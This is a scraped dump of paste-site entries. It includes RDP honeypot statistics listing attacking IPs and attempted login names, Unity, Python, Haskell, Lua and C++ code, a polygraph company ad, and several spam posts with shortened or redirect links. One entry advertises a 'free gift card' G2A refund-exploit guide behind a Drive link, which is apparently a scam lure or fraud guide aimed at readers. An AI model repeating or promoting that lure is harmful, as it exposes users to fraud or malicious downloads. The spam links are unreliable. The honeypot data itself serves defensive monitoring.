id,title,username,language,date,content
690P6EQm,2024-02-29_stats.json,rdp_snitch,JSON,Thursday 29th of February 2024 06:16:17 PM CDT,"{
  ""ip"": {
    ""211.117.14.229"": 2,
    ""196.190.117.7"": 2,
    ""174.138.17.240"": 2,
    ""87.251.75.145"": 8,
    ""205.210.31.53"": 6,
    ""45.227.254.26"": 8,
    ""212.70.149.142"": 6,
    ""85.209.11.23"": 2,
    ""80.66.76.92"": 4,
    ""141.98.81.148"": 4,
    ""185.196.220.41"": 6,
    ""193.142.146.227"": 6,
    ""123.56.20.194"": 2,
    ""62.204.41.107"": 12,
    ""94.232.45.92"": 6,
    ""162.142.125.217"": 2,
    ""103.47.73.122"": 4,
    ""45.227.254.9"": 6,
    ""187.191.116.227"": 8,
    ""185.170.144.3"": 4,
    ""15.235.189.151"": 2,
    ""198.235.24.240"": 6,
    ""185.129.51.52"": 2,
    ""36.91.222.100"": 2,
    ""173.255.206.82"": 8,
    ""142.93.206.143"": 2,
    ""143.198.220.26"": 4,
    ""103.143.207.200"": 580,
    ""152.32.156.117"": 2,
    ""49.157.47.214"": 4,
    ""176.113.115.58"": 2,
    ""130.85.190.243"": 2,
    ""205.210.31.175"": 6,
    ""185.122.204.179"": 6,
    ""101.36.114.124"": 2,
    ""87.251.75.64"": 2,
    ""120.240.145.8"": 2,
    ""194.165.16.76"": 4,
    ""194.165.16.37"": 4,
    ""136.144.35.217"": 2,
    ""198.235.24.196"": 6
  },
  ""asn"": {
    ""AS9318"": 2,
    ""AS24757"": 2,
    ""AS14061"": 8,
    ""AS208091"": 14,
    ""AS396982"": 24,
    ""AS267784"": 14,
    ""AS204428"": 6,
    ""AS57523"": 8,
    ""AS209588"": 4,
    ""AS208046"": 12,
    ""AS37963"": 2,
    ""AS59425"": 12,
    ""AS212482"": 6,
    ""AS398324"": 2,
    ""AS133676"": 4,
    ""AS262545"": 8,
    ""AS197414"": 4,
    ""AS16276"": 2,
    ""AS200532"": 2,
    ""AS7713"": 2,
    ""AS63949"": 8,
    ""AS18403"": 580,
    ""AS135377"": 4,
    ""AS9658"": 4,
    ""AS57678"": 2,
    ""AS11131"": 2,
    ""AS56040"": 2,
    ""AS48721"": 8,
    ""AS396356"": 2
  },
  ""isp"": {
    ""SK Broadband Co Ltd"": 2,
    ""Ethiotelecom"": 2,
    ""DigitalOcean, LLC"": 8,
    ""Xhost Internet Solutions LP"": 24,
    ""Google LLC"": 24,
    ""Flyservers S.A."": 26,
    ""SS-Net"": 6,
    ""Chang Way Technologies Co. Limited"": 8,
    ""ColocationX Ltd."": 12,
    ""Hangzhou Alibaba Advertising Co"": 2,
    ""Horizon LLC"": 12,
    ""Censys, Inc."": 2,
    ""Precious netcom pvt ltd"": 4,
    ""Mandic S.A."": 8,
    ""OVH Singapore PTE. LTD"": 2,
    ""LLP \""Kompaniya Hoster.KZ\"""": 2,
    ""PT Telekomunikasi Indonesia"": 2,
    ""Akamai Technologies, Inc."": 8,
    ""Vietnam Internet Network Information Center"": 580,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 4,
    ""Eastern Telecommunications Philippines, Inc."": 4,
    ""Cat Technologies Co. Limited"": 2,
    ""University of Maryland Baltimore County"": 2,
    ""China Mobile communications corporation"": 2,
    ""Latitude.sh"": 2
  },
  ""org"": {
    ""SK Broadband Co Ltd"": 2,
    ""Unknown"": 2,
    ""DigitalOcean, LLC"": 8,
    ""Xhost Internet Solutions"": 14,
    ""Palo Alto Networks, Inc"": 24,
    ""UAB Host Baltic"": 14,
    ""4Media Ltd"": 6,
    ""Chang Way Technologies Co. Limited"": 2,
    ""Flyservers S.A"": 12,
    ""Makut Investments"": 6,
    ""ColocationX Ltd"": 6,
    ""Aliyun Computing Co., LTD"": 2,
    ""Horizon LLC"": 12,
    ""Dmitriy Panchenko"": 6,
    ""Censys Inc"": 2,
    ""Gstech Software Systems Pvt Ltd"": 4,
    ""Mandic S.A"": 8,
    ""Xhostis"": 4,
    ""Patrice, Auffret"": 2,
    ""Hosterkz Network"": 2,
    ""Telekomunikasi Indonesia"": 2,
    ""Linode"": 8,
    ""Everest Global Joint Stock Company"": 580,
    ""Ucloud Information Technology (hk) Limited"": 4,
    ""DSL Network"": 4,
    ""Cat Technologies Co. Limited"": 2,
    ""University of Maryland Baltimore County"": 2,
    ""Starcrecium Limited"": 6,
    ""China Mobile"": 2,
    ""Panq B.V"": 2
  },
  ""regionName"": {
    ""Incheon"": 2,
    ""Addis Ababa"": 2,
    ""South West"": 6,
    ""North Holland"": 24,
    ""California"": 24,
    ""Vilnius"": 14,
    ""Plovdiv"": 6,
    ""Moscow"": 22,
    ""Drenthe"": 4,
    ""Virginia"": 6,
    ""Beijing"": 2,
    ""Perm Krai"": 6,
    ""Michigan"": 2,
    ""National Capital Territory of Delhi"": 4,
    ""Sao Paulo"": 8,
    ""North West"": 2,
    ""Karaganda"": 2,
    ""Jakarta"": 2,
    ""Texas"": 8,
    ""New Jersey"": 4,
    ""Hanoi"": 580,
    ""Maharashtra"": 2,
    ""Metro Manila"": 4,
    ""Maryland"": 2,
    ""Seoul"": 2,
    ""Guangdong"": 2,
    ""Kaunas"": 8
  },
  ""country"": {
    ""South Korea"": 4,
    ""Ethiopia"": 2,
    ""Singapore"": 8,
    ""The Netherlands"": 28,
    ""United States"": 46,
    ""Lithuania"": 22,
    ""Bulgaria"": 6,
    ""Russia"": 28,
    ""China"": 4,
    ""India"": 6,
    ""Brazil"": 8,
    ""Kazakhstan"": 2,
    ""Indonesia"": 2,
    ""Vietnam"": 580,
    ""Philippines"": 4
  },
  ""account"": {
    ""(empty)"": 8,
    ""Test"": 28,
    ""hello"": 604,
    ""Administr"": 42,
    ""tAGzHuhjj"": 2,
    ""MEYMac"": 2,
    ""FKpdTr"": 2,
    ""Domain"": 26,
    ""Administrator"": 6,
    ""WDLhNieRX"": 2,
    ""rxlqNM"": 2,
    ""TQMKAM"": 2,
    ""fvlmf2qr"": 8,
    ""beio"": 2,
    ""IIZIkMA"": 2,
    ""aXQDnYsnH"": 2,
    ""hhWCiL"": 2,
    ""RZrIPt"": 2,
    ""oJcQMQbqT"": 2,
    ""EMppHB"": 2,
    ""WtyWgi"": 2
  },
  ""keyboard"": {
    ""Unknown"": 750
  },
  ""client_build"": {
    ""Unknown"": 750
  },
  ""client_name"": {
    ""Unknown"": 750
  },
  ""ip_type"": {
    ""Unknown"": 670,
    ""hosting & proxy"": 6,
    ""hosting"": 52,
    ""proxy"": 14,
    ""mobile"": 8
  }
}"
Uj7a6E4F,2024-02-29_stats.json,rdp_snitch,JSON,Thursday 29th of February 2024 06:15:09 PM CDT,"{
  ""ip"": {
    ""211.117.14.229"": 1,
    ""196.190.117.7"": 1,
    ""174.138.17.240"": 1,
    ""87.251.75.145"": 4,
    ""205.210.31.53"": 3,
    ""45.227.254.26"": 4,
    ""212.70.149.142"": 3,
    ""85.209.11.23"": 1,
    ""80.66.76.92"": 2,
    ""141.98.81.148"": 2,
    ""185.196.220.41"": 3,
    ""193.142.146.227"": 3,
    ""123.56.20.194"": 1,
    ""62.204.41.107"": 6,
    ""94.232.45.92"": 3,
    ""162.142.125.217"": 1,
    ""103.47.73.122"": 2,
    ""45.227.254.9"": 3,
    ""187.191.116.227"": 4,
    ""185.170.144.3"": 2,
    ""15.235.189.151"": 1,
    ""198.235.24.240"": 3,
    ""185.129.51.52"": 1,
    ""36.91.222.100"": 1,
    ""173.255.206.82"": 4,
    ""142.93.206.143"": 1,
    ""143.198.220.26"": 2,
    ""103.143.207.200"": 290,
    ""152.32.156.117"": 1,
    ""49.157.47.214"": 2,
    ""176.113.115.58"": 1,
    ""130.85.190.243"": 1,
    ""205.210.31.175"": 3,
    ""185.122.204.179"": 3,
    ""101.36.114.124"": 1,
    ""87.251.75.64"": 1,
    ""120.240.145.8"": 1,
    ""194.165.16.76"": 2,
    ""194.165.16.37"": 2,
    ""136.144.35.217"": 1,
    ""198.235.24.196"": 3
  },
  ""asn"": {
    ""AS9318"": 1,
    ""AS24757"": 1,
    ""AS14061"": 4,
    ""AS208091"": 7,
    ""AS396982"": 12,
    ""AS267784"": 7,
    ""AS204428"": 3,
    ""AS57523"": 4,
    ""AS209588"": 2,
    ""AS208046"": 6,
    ""AS37963"": 1,
    ""AS59425"": 6,
    ""AS212482"": 3,
    ""AS398324"": 1,
    ""AS133676"": 2,
    ""AS262545"": 4,
    ""AS197414"": 2,
    ""AS16276"": 1,
    ""AS200532"": 1,
    ""AS7713"": 1,
    ""AS63949"": 4,
    ""AS18403"": 290,
    ""AS135377"": 2,
    ""AS9658"": 2,
    ""AS57678"": 1,
    ""AS11131"": 1,
    ""AS56040"": 1,
    ""AS48721"": 4,
    ""AS396356"": 1
  },
  ""isp"": {
    ""SK Broadband Co Ltd"": 1,
    ""Ethiotelecom"": 1,
    ""DigitalOcean, LLC"": 4,
    ""Xhost Internet Solutions LP"": 12,
    ""Google LLC"": 12,
    ""Flyservers S.A."": 13,
    ""SS-Net"": 3,
    ""Chang Way Technologies Co. Limited"": 4,
    ""ColocationX Ltd."": 6,
    ""Hangzhou Alibaba Advertising Co"": 1,
    ""Horizon LLC"": 6,
    ""Censys, Inc."": 1,
    ""Precious netcom pvt ltd"": 2,
    ""Mandic S.A."": 4,
    ""OVH Singapore PTE. LTD"": 1,
    ""LLP \""Kompaniya Hoster.KZ\"""": 1,
    ""PT Telekomunikasi Indonesia"": 1,
    ""Akamai Technologies, Inc."": 4,
    ""Vietnam Internet Network Information Center"": 290,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Eastern Telecommunications Philippines, Inc."": 2,
    ""Cat Technologies Co. Limited"": 1,
    ""University of Maryland Baltimore County"": 1,
    ""China Mobile communications corporation"": 1,
    ""Latitude.sh"": 1
  },
  ""org"": {
    ""SK Broadband Co Ltd"": 1,
    ""Unknown"": 1,
    ""DigitalOcean, LLC"": 4,
    ""Xhost Internet Solutions"": 7,
    ""Palo Alto Networks, Inc"": 12,
    ""UAB Host Baltic"": 7,
    ""4Media Ltd"": 3,
    ""Chang Way Technologies Co. Limited"": 1,
    ""Flyservers S.A"": 6,
    ""Makut Investments"": 3,
    ""ColocationX Ltd"": 3,
    ""Aliyun Computing Co., LTD"": 1,
    ""Horizon LLC"": 6,
    ""Dmitriy Panchenko"": 3,
    ""Censys Inc"": 1,
    ""Gstech Software Systems Pvt Ltd"": 2,
    ""Mandic S.A"": 4,
    ""Xhostis"": 2,
    ""Patrice, Auffret"": 1,
    ""Hosterkz Network"": 1,
    ""Telekomunikasi Indonesia"": 1,
    ""Linode"": 4,
    ""Everest Global Joint Stock Company"": 290,
    ""Ucloud Information Technology (hk) Limited"": 2,
    ""DSL Network"": 2,
    ""Cat Technologies Co. Limited"": 1,
    ""University of Maryland Baltimore County"": 1,
    ""Starcrecium Limited"": 3,
    ""China Mobile"": 1,
    ""Panq B.V"": 1
  },
  ""regionName"": {
    ""Incheon"": 1,
    ""Addis Ababa"": 1,
    ""South West"": 3,
    ""North Holland"": 12,
    ""California"": 12,
    ""Vilnius"": 7,
    ""Plovdiv"": 3,
    ""Moscow"": 11,
    ""Drenthe"": 2,
    ""Virginia"": 3,
    ""Beijing"": 1,
    ""Perm Krai"": 3,
    ""Michigan"": 1,
    ""National Capital Territory of Delhi"": 2,
    ""Sao Paulo"": 4,
    ""North West"": 1,
    ""Karaganda"": 1,
    ""Jakarta"": 1,
    ""Texas"": 4,
    ""New Jersey"": 2,
    ""Hanoi"": 290,
    ""Maharashtra"": 1,
    ""Metro Manila"": 2,
    ""Maryland"": 1,
    ""Seoul"": 1,
    ""Guangdong"": 1,
    ""Kaunas"": 4
  },
  ""country"": {
    ""South Korea"": 2,
    ""Ethiopia"": 1,
    ""Singapore"": 4,
    ""The Netherlands"": 14,
    ""United States"": 23,
    ""Lithuania"": 11,
    ""Bulgaria"": 3,
    ""Russia"": 14,
    ""China"": 2,
    ""India"": 3,
    ""Brazil"": 4,
    ""Kazakhstan"": 1,
    ""Indonesia"": 1,
    ""Vietnam"": 290,
    ""Philippines"": 2
  },
  ""account"": {
    ""(empty)"": 4,
    ""Test"": 14,
    ""hello"": 302,
    ""Administr"": 21,
    ""tAGzHuhjj"": 1,
    ""MEYMac"": 1,
    ""FKpdTr"": 1,
    ""Domain"": 13,
    ""Administrator"": 3,
    ""WDLhNieRX"": 1,
    ""rxlqNM"": 1,
    ""TQMKAM"": 1,
    ""fvlmf2qr"": 4,
    ""beio"": 1,
    ""IIZIkMA"": 1,
    ""aXQDnYsnH"": 1,
    ""hhWCiL"": 1,
    ""RZrIPt"": 1,
    ""oJcQMQbqT"": 1,
    ""EMppHB"": 1,
    ""WtyWgi"": 1
  },
  ""keyboard"": {
    ""Unknown"": 375
  },
  ""client_build"": {
    ""Unknown"": 375
  },
  ""client_name"": {
    ""Unknown"": 375
  },
  ""ip_type"": {
    ""Unknown"": 335,
    ""hosting & proxy"": 3,
    ""hosting"": 26,
    ""proxy"": 7,
    ""mobile"": 4
  }
}"
mqbPdJXf,Review New Pastesbin,xxsa,PHP,Thursday 29th of February 2024 06:11:49 PM CDT,https://pastes.io/?red=pastes
Yw7549BG,Blaze Mover,BillMolloy,C#,Thursday 29th of February 2024 06:05:42 PM CDT,"using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.UI;



public class BlazeMover : MonoBehaviour
{
    [SerializeField] Animator anim;
    [SerializeField] LayerMask ground;
    [SerializeField] Transform groundCheck;
    [SerializeField] float xtiltMax;
    [SerializeField] float xtiltMin;
    [SerializeField] float ytiltMax;
    [SerializeField] float ytiltMin;
    [SerializeField] float xDeadZoneMin;
    [SerializeField] float xDeadZoneMax;
    [SerializeField] float yDeadZoneMin;
    [SerializeField] float yDeadZoneMax;
    public float xAcceleration;
    public float yAcceleration;
    public Vector3 acceleration;
    public Vector3 movementDir;
    public float horizontalMove;
    public float verticalMove;
    public float speed = 5f;


    void Update()
    {
        GroundCheck();
        Movement();
        Direction();
    }

    private void Movement()
    {
        // Get the accelerometer input
        acceleration = Input.acceleration;

        // Adjust the sensitivity
        acceleration = acceleration * Mathf.Pow(10, 1);

        // Clamp the accelerometer values within the defined tilt ranges
        xAcceleration = Mathf.Clamp(acceleration.x, xtiltMin, xtiltMax);
        yAcceleration = Mathf.Clamp(acceleration.y, ytiltMin, ytiltMax);

        // Apply dead zone for x-axis
        if (xAcceleration >= xDeadZoneMin && xAcceleration <= xDeadZoneMax)
        {
            xAcceleration = 0f; // Set xAcceleration to 0 if it's within the dead zone
        }

        // Apply dead zone for y-axis
        if (yAcceleration >= yDeadZoneMin && yAcceleration <= yDeadZoneMax)
        {
            yAcceleration = 0f; // Set yAcceleration to 0 if it's within the dead zone
        }

        // Calculate horizontal and vertical movement based on device orientation
        horizontalMove = -yAcceleration * speed;  // Adjusted for left-right movement
        verticalMove = xAcceleration * speed;     // Adjusted for forward-backward movement

        // Update the animation parameters
        anim.SetFloat(""x"", horizontalMove);
        anim.SetFloat(""y"", verticalMove);
    }



    //y axis on phone is forward and back, z in world
    //x axis on phone is left to right, x in world
    void Direction()
        {
            if (horizontalMove == 0 && verticalMove == 0)
            {
                transform.forward = Vector3.zero;
                movementDir = Vector3.zero;
                horizontalMove = 0;
                verticalMove = 0;
            }
            else
            {
                movementDir = new Vector3(horizontalMove, 0, verticalMove);
                movementDir.Normalize();
                transform.forward = movementDir;
                transform.Translate(speed * Time.deltaTime * movementDir, Space.World);
            }
        }

        void GroundCheck()
        {
            if (IsGrounded() == true)
            {
                anim.SetBool(""InAir"", false);
            }
            else
            {
                anim.SetBool(""InAir"", true);
                Debug.DrawLine(groundCheck.position, groundCheck.position + Vector3.down, Color.red);
            }
        }

        bool IsGrounded()
        {
            return Physics.CheckSphere(groundCheck.position, .3f, ground);
        }
}"
7rMj3ygk,Mega vs Sitrus Blastoise,flywinged,Python,Thursday 29th of February 2024 06:03:56 PM CDT,"# Python 3

# Assuming Jan's Blastoise IVs of 30 22 25 26 4 16

from random import random

N = 4_000_000
wins = 0
losses = 0
badResults = 0
riskingCrit = 0

testMega = True # NOTE: Change this to test mega or sitrus

minSlash = 23.6 if testMega else 25.4
maxSlash = 28 if testMega else 30.2
slashRange = maxSlash - minSlash

minBreak = 27.6 if testMega else 23
maxBreak = 32.8 if testMega else 27.2
breakRange = maxBreak - minBreak

riskPercent = maxSlash * 2.25

for i in range(N):

    turns = 0
    blastoiseHealth = 100
    inteleonHealth = 100

    risking = False

    while blastoiseHealth > 0 and inteleonHealth > 0:

        turns += 1
        breakDamage = minBreak + breakRange*random()

        if random() < 1/16:
            breakDamage *= 1.5

        seesKill = False
        if blastoiseHealth < minSlash:
            seesKill = True
        elif blastoiseHealth < maxSlash and random() > (blastoiseHealth-minSlash) / slashRange:
            seesKill = True
 
        # 11.666 is the percent chance of using air slash given mixed blastoise and light clay
        # 20% percent chance for slash to be +8 and tie with some screens
        # if slash ties, then 4 options, all equally likely.
        #   - Reflect +8, Screen +8 -> 1/3 chance to air slash
        #   - Reflect +8, Screen +7 -> 1/2 chance to air slash
        #   - Reflect +7, Screen +8 -> 1/2 chance to air slash
        #   - Reflect +7, Screen +7 -> 100% chance to slash
        # Altogether that is 25%*1/3 + 25%*1/2 + 25%*1/2 + 25%*1 = 58.33% Chance if rolls +8 slash
        #   This corresponds to a total of 58.33% * .2 = 11.666% chance to roll air slash.
        if random() < .1166666 or seesKill:
            slashDamage = minSlash + slashRange*random()
            if random() < 1/16:
                slashDamage *= 2.25
            blastoiseHealth -= slashDamage

            # flinches 30% of the time
            if random() > .3:
               inteleonHealth -= breakDamage

        else:
            inteleonHealth -= breakDamage

        # This is sitrus. Activates at less than 50% health
        if not testMega and blastoiseHealth < 50:
            blastoiseHealth += 25

        # Track any risk
        if blastoiseHealth < riskPercent and not risking:
            risking = True


    if blastoiseHealth < 0:
        losses += 1
    else:
        wins += 1
    
    if risking:
        riskingCrit += 1

print(wins/N, losses/N)
print(riskingCrit / N)

# Win = Blastoise survives and intelleon has no screens
# Lose = Blastoise dies and intelleon does not have screen up with some unknown hp

# All numbers are approximate as it is a simulation and some things damage
# calcs are smooth rather than discrete

# For mega, numbers are
# 98.9% Win, 1.1% lose
# 9.3% to be risking crit at some point

# For sitrus
# 99.99% Win, .01% lose
# 5.74% to be risking crit at some point"
MeKHqbSW,G2A.com Free Gift Card Guide Feb 2024,ounnuo,GetText,Thursday 29th of February 2024 05:47:17 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_702105.pdf

Working as of:
29 February 2024"
sjTgUJFm,Ireland Lie Detector,spidspun,HTML,Thursday 29th of February 2024 05:08:29 PM CDT,"LIE DETECTOR LTD. IS THE LONGEST ESTABLISHED POLYGRAPH BUSINESS IN IRELAND
BPA / APA QUALIFIED, CERTIFIED | SIAN DEVINE MBA, M.SC.
When you choose us, you are choosing the most experienced and reliable examiners in Ireland. We are also the longest established polygraph business in Ireland. You can depend on us to deliver trustworthy results which will stand up to professional scrutiny. Our polygraph services are provided to corporate entities, businesses, government agencies, the legal profession and the general public. All our examiners are highly qualified and professional. We offer a reliable, flexible discreet service. All enquiries are treated in the strictest of confidence and all general enquiries are welcome.
<a href=""https://liedetector.ie/"">Lie Detector LTD Ireland</a>
01 685 4715
<a href=""https://maps.app.goo.gl/z2vzojkfJKmiLPgw5"">Lie Detector LTD Ireland</a>

"
Tnnvyn9J,"Quick, reliable pseudo-shuffler (enhanced)",banovski,Haskell,Thursday 29th of February 2024 05:06:24 PM CDT,"import Data.Function
import Data.List
import Data.List.Split

orderLists :: [a] -> [a] -> ([a], [a])
orderLists xs ys
  | on compare length xs ys == LT = (xs, ys)
  | otherwise = (ys, xs)

listsLengthQuotient :: ([a], [a]) -> ([a], [a], Int)
listsLengthQuotient (xs, ys) =
  (xs, ys, (round $ on (/) (fromIntegral . length) ys xs) :: Int)

groupListItems :: ([a], [a], Int) -> ([[a]], [[a]])
groupListItems (xs, ys, q) = (chunksOf 1 xs, chunksOf q ys)

merge :: ([a], [a]) -> [a]
merge (xs, []) = xs
merge ([], ys) = ys
merge (x:xs, y:ys) = x : y : merge (xs, ys)

mixLists :: [a] -> [a] -> [a]
mixLists xs ys =
  concat $ merge $ groupListItems $ listsLengthQuotient $ orderLists xs ys

main :: IO ()
main = do
  input <- getContents
  mapM_ putStrLn $
    foldl1 mixLists $ sortBy (on compare length) (group . sort $ lines input)
"
ubERFjFe,TvTurtle,erice0703,Lua,Thursday 29th of February 2024 03:14:35 PM CDT,"local modem = peripheral.find(""modem"")
local xi,yi,zi = gps.locate()
local xf,yf,zf = 5600, 152, 1306

local function GrabItems()
	local wool, monitor, computer = false, false, false
	repeat
		turtle.select(1)
		turtle.suckUp()
		local item = turtle.getItemDetail()
		if item.name == ""minecraft:white_wool"" then
			turtle.transferTo(5)
			wool = true
		elseif item.name == ""computercraft:monitor_advanced"" then
			turtle.transferTo(6)
			monitor = true
		elseif item.name == ""computercraft:computer_advanced"" then
			turtle.transferTo(7)
			computer = true
		end
	until wool == true and monitor == true and computer == true
end

local function Down(y)
	local yf = y
	local xi,yi,zi = gps.locate()
	turtle.forward()
	while yi ~= yf do
		turtle.down()
		xi,yi,zi = gps.locate()
	end
end
	
local function moveX(x,z)
	local x,z = x,z
	local xi,yi,zi = gps.locate()
	turtle.turnLeft()
	local difx = math.abs(x-xi)
	for i=1,difx do
	turtle.forward()
	end
end

local function moveZ(x,z)
	local x,z = x,z
	local xi,yi,zi = gps.locate()
	turtle.turnRight()
	local difz = math.abs(z-zi)
	for i =1,difz do
	turtle.forward()
	end
end

local function PlaceUp()
	turtle.place()
	turtle.up()
	turtle.place()
end

local function PlaceDown()
	turtle.place()
	turtle.down()
	turtle.place()
end
local function ForwardRight()
	turtle.turnRight()
	turtle.forward()
	turtle.turnLeft()
end
local function ForwardLeft()
	turtle.turnLeft()
	turtle.forward()
	turtle.turnRight()
end
local function backing()
	turtle.select(5)
	PlaceUp()
	ForwardLeft()
	PlaceDown()
	ForwardLeft()
	PlaceUp()
end


local function PlaceTV()
	turtle.select(6)
	turtle.back()
	
	PlaceDown()
	ForwardRight()
	PlaceUp()
	ForwardRight()
	PlaceDown()
end

local function PlaceComputer()
	turtle.select(7)
	turtle.down()
	ForwardLeft()
	turtle.place()
	turtle.turnRight()
	turtle.forward()
	turtle.forward()
	turtle.turnLeft()
	turtle.forward()
end
local function Dig()
	turtle.dig()
	turtle.digUp()
end
local function RemoveBacking()
	turtle.forward()
	turtl.turnLeft()
	turtle.up()
	Dig()
	turtle.forward()
	Dig()
	turtle.forward()
	Dig()
end	

local function Return()
	local x,y,z = 5600, 155, 1308
	local xi,yi,zi = gps.locate()
	turtle.turnRight()
	turtle.turnRight()
	for i=1,(math.abs(x-xi)) do
		turtle.forward()
	end
	for i=1,(math.abs(y-yi)) do
		turtle.up()
	end
	turtle.forward()
	turtle.turnRight()
	turtle.turnRight()

end


GrabItems()
Down(yf)
moveX(xf,zf)
turtle.turnRight()
turtle.up()
turtle.forward()
turtle.turnRight()
backing()
PlaceTV()
PlaceComputer()
RemoveBacking()
Return()"
f8Vd7etD,Untitled,sissou123,HTML,Thursday 29th of February 2024 03:06:31 PM CDT,"60 HTML CSS JS projects - HTML5, CSS3 and vanilla JavaScript
HTML CSS JS (JavaScript). Build 60 projects to learn HTML CSS JavaScript. 50+ HTML5, CSS3, vanilla JavaScript projects 
What you'll learn
Acquire the skills to develop exciting projects from scratch with pure HTML, CSS, and JavaScript - no external libraries or plugins needed!
Expand your knowledge of HTML, CSS, and JavaScript while mastering responsive web design principles. 
for more:https://cuty.io/98Ie
"
RpZ2YthU,Untitled,VMaksimoski008,C++,Thursday 29th of February 2024 02:50:43 PM CDT,"#include <bits/stdc++.h>
 
#define sz(x) (int)x.size()
#define all(x) x.begin(), x.end()
#define rall(x) x.rbegin(), x.rend()
//#define int long long
 
using namespace std;
 
using ll = long long;
using ull = unsigned long long;
using ld = long double;
using pii = pair<int, int>;
using pll = pair<ll, ll>;
 
const int mod = 1e9 + 7;
const int LOG = 20;
const int maxn = 1e5 + 5;
const double eps = 1e-9;
 
struct SegTree {
    int n;
    vector<int> tree;
 
    SegTree(int _n) {
        n = _n;
        tree.resize(4*n+5);
    }
 
    void update(int u, int tl, int tr, int pos, int val) {
        if(tl == tr) {
            tree[u] += val;
        } else {
            int tm = (tl + tr) / 2;
            if(pos <= tm)
                update(2*u, tl, tm, pos, val);
            else
                update(2*u+1, tm+1, tr, pos, val);
            tree[u] = tree[2*u] + tree[2*u+1];
        }
    }
 
    int find(int u, int tl, int tr, int k) {
        if(tl == tr) return tl;
        int tm = (tl + tr) / 2;
        if(tree[2*u] >= k) return find(2*u, tl, tm, k);
        return find(2*u+1, tm+1, tr, k - tree[2*u]);
    }
 
    void update(int p, int v) { update(1, 0, n-1, p, v); }
    int find(int k) { return find(1, 0, n-1, k); }
} tree(100005);
 
int n, L, H, del[maxn], sub[maxn], ans = 0;
vector<pii> graph[maxn];
vector<int> comp;
 
int get_sub(int u, int p) {
    sub[u] = 1;
    for(auto &[v, _] : graph[u]) {
        if(v == p || del[v]) continue;
        sub[u] += get_sub(v, u);
    }
    return sub[u];
}
 
int get_cen(int u, int sz, int p) {
    for(auto &[v, _] : graph[u]) {
        if(v == p || del[v]) continue;
        if(2 * sub[v] > sz) return get_cen(v, sz, u);
    }
    return u;
}
 
void calc(int u, int p, int len) {
    if(len >= L && len <= H) {
        ans = max(ans, comp[tree.find((len+2)/2)]);
    }
 
    if(len == H) return ;
 
    for(auto &[v, w] : graph[u]) {
        if(v == p || del[v]) continue;
        int pos = lower_bound(all(comp), w) - comp.begin();
        tree.update(pos, 1);
        calc(v, u, len+1);
        tree.update(pos, -1);
    }
}
 
void build(int u) {
    int cen = get_cen(u, get_sub(u, 0), 0);
 
    del[cen] = 1;
 
    calc(cen, 0, 0);
 
    for(auto &[v, _] : graph[cen]) {
        if(del[v]) continue;
        build(v);
    }
}
 
int32_t main() {
    cin >> n >> L >> H;
 
    set<int> s;
    for(int i=0; i<n-1; i++) {
        int a, b, w;
        cin >> a >> b >> w;
        s.insert(w);
        graph[a].push_back({ b, w });
        graph[b].push_back({ a, w });
    }
 
    comp = vector<int>(all(s));
 
    build(1);
 
    cout << ans << '\n';
    return 0;
}"
4uZVu68v,Untitled,sissou123,HTML,Thursday 29th of February 2024 02:46:20 PM CDT,"The HTML & CSS Bootcamp 2024 Edition
Brand New Course! Covers Flexbox, CSS Grid, Animations, Responsive Design and More! Tons of Exercises &amp; Projects 
What you'll learn
Master HTML & CSS and build massive real-world projects, with no prior knowledge needed!
How to write well-structured and semantic HTML documents 
for more:https://cuty.io/68VQ
"
USqrrGub,sdgsegsg,bartekltg,C++,Thursday 29th of February 2024 02:25:03 PM CDT,"#include <iostream>
#include <algorithm>
#include <vector>
#include <set>

using namespace std;

set<tuple<int, int, int>> S;

void foo (int a,int b,int c){
    if ( a+b+c>31)
        return;
    if (S.find(make_tuple(a,b,c)) !=S.end())
        return;
    S.insert(make_tuple(a,b,c));
    //cout<<a<<"" ""<<b<<"" ""<<c<<endl;

    if (a>=1)
        foo(a-1,b+1,c+1) ;
    if (b>=1)
        foo(a+1,b-1,c+1) ;
    if (c>=1)
        foo(a+1,b+1,c-1) ;
}

int main()
{
    foo(1,0,0);
    foo(0,1,0);
    foo(0,0,1);

    for (auto e : S)
    {
        if (get<0>(e)<=10 && get<1>(e)<=10 && get<2>(e)<=10)
           cout<<get<0>(e)<<"" ""<<get<1>(e)<<"" ""<<get<2>(e)<<"" ""<<endl;
    }
    return 0;
}
/* results 
0 0 1 
0 1 0 
0 1 1 
0 1 2 
0 1 3 
0 1 4 
0 1 5 
0 1 6 
0 1 7 
0 1 8 
0 1 9 
0 1 10 
0 2 1 
0 2 3 
0 2 5 
0 2 7 
0 2 9 
0 3 1 
0 3 2 
0 3 3 
0 3 4 
0 3 5 
0 3 6 
0 3 7 
0 3 8 
0 3 9 
0 3 10 
0 4 1 
0 4 3 
0 4 5 
0 4 7 
0 4 9 
0 5 1 
0 5 2 
0 5 3 
0 5 4 
0 5 5 
0 5 6 
0 5 7 
0 5 8 
0 5 9 
0 5 10 
0 6 1 
0 6 3 
0 6 5 
0 6 7 
0 6 9 
0 7 1 
0 7 2 
0 7 3 
0 7 4 
0 7 5 
0 7 6 
0 7 7 
0 7 8 
0 7 9 
0 7 10 
0 8 1 
0 8 3 
0 8 5 
0 8 7 
0 8 9 
0 9 1 
0 9 2 
0 9 3 
0 9 4 
0 9 5 
0 9 6 
0 9 7 
0 9 8 
0 9 9 
0 9 10 
0 10 1 
0 10 3 
0 10 5 
0 10 7 
0 10 9 
1 0 0 
1 0 1 
1 0 2 
1 0 3 
1 0 4 
1 0 5 
1 0 6 
1 0 7 
1 0 8 
1 0 9 
1 0 10 
1 1 0 
1 1 2 
1 1 4 
1 1 6 
1 1 8 
1 1 10 
1 2 0 
1 2 1 
1 2 2 
1 2 3 
1 2 4 
1 2 5 
1 2 6 
1 2 7 
1 2 8 
1 2 9 
1 2 10 
1 3 0 
1 3 2 
1 3 4 
1 3 6 
1 3 8 
1 3 10 
1 4 0 
1 4 1 
1 4 2 
1 4 3 
1 4 4 
1 4 5 
1 4 6 
1 4 7 
1 4 8 
1 4 9 
1 4 10 
1 5 0 
1 5 2 
1 5 4 
1 5 6 
1 5 8 
1 5 10 
1 6 0 
1 6 1 
1 6 2 
1 6 3 
1 6 4 
1 6 5 
1 6 6 
1 6 7 
1 6 8 
